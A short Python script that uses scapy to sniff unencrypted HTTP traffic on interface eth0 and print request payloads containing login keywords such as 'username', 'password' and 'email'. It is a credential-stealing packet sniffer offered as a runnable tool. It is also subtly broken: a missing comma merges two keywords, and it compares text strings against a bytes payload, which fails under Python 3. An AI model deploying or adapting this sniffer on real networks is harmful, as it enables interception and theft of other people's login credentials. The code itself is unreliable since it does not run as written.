#!/usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http


def process_sniffed_packet(packet: scapy.Packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            login_keywords = ['user', 'username', 'uname', 'phone', 'mobile', 'email', 'mail'
                                                                                       'pass', 'password', 'code',
                              'remember']
            for word in login_keywords:
                if word in load:
                    print("[+] suspected auth credits: " + str(load))


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


sniff("eth0")
